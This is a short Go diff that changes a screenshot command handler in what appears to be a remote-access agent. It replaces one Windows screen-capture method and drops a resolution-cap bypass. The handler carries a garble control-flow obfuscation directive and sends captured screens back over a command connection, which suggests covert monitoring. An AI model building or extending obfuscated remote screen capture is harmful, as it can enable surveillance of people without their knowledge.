@@ -18,15 +18,13 @@ import (
 )
 
 var (
-	monitorCountFn             = capture.MonitorCount
-	displayBoundsFn            = capture.DisplayBounds
-	captureDisplayRGBABitBltFn = capture.CaptureDisplayRGBABitBlt
+	monitorCountFn  = capture.MonitorCount
+	displayBoundsFn = capture.DisplayBounds
+	captureRectFn   = screenshot.CaptureRect
 )
 
 func HandleScreenshot(ctx context.Context, env *rt.Env, cmdID string, allDisplays bool) error {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
-	restore := capture.BypassResolutionCap()
-	defer restore()
 
 	if allDisplays {
 		log.Printf("screenshot: capturing all displays")
@@ -85,8 +83,6 @@ func HandleScreenshot(ctx context.Context, env *rt.Env, cmdID string, allDisplay
 		log.Printf("screenshot: failed to send screenshot result: %v", err)
 		return err
 	}
-
-	capture.RequestDesktopH264Keyframe()
 
 	return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
 		Type:      "command_result",
@@ -157,7 +153,8 @@ func captureScreenshotImageWindows(allDisplays bool) (*image.RGBA, int, image.Re
 	}
 
 	if !allDisplays {
-		img, err := captureDisplayRGBABitBltFn(0)
+		bounds := displayBoundsFn(0)
+		img, err := captureRectFn(bounds)
 		if err != nil || img == nil {
 			return nil, 0, image.Rectangle{}, err
 		}
@@ -174,7 +171,7 @@ func captureScreenshotImageWindows(allDisplays bool) (*image.RGBA, int, image.Re
 
 	for i := 0; i < monitorCount; i++ {
 		bounds := displayBoundsFn(i)
-		img, err := captureDisplayRGBABitBltFn(i)
+		img, err := captureRectFn(bounds)
 		if err != nil || img == nil {
 			return nil, 0, image.Rectangle{}, err
 		}
